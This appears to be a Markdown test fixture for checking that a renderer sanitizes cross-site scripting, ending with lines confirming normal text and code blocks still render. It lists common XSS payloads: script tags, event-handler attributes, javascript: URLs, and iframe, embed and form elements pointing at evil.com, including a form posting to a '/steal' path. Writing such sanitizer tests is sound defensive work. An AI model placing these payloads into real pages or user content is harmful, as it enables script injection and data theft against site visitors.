# XSS Test

<script>alert('xss')</script>

<img src="x" onerror="alert('xss')">

[Click me](javascript:alert('xss'))

<p onclick="alert('xss')">Click me</p>

<iframe src="https://evil.com"></iframe>

<form action="https://evil.com/steal"><input type="text"><button>Submit</button></form>

<svg onload="alert('xss')"></svg>

<object data="javascript:alert('xss')"></object>

<embed src="https://evil.com/xss.swf">

<style>
  body { background: url("javascript:alert('xss')"); }
</style>

Normal text should still render fine.

```html
<script>console.log('safe in code block')</script>
```
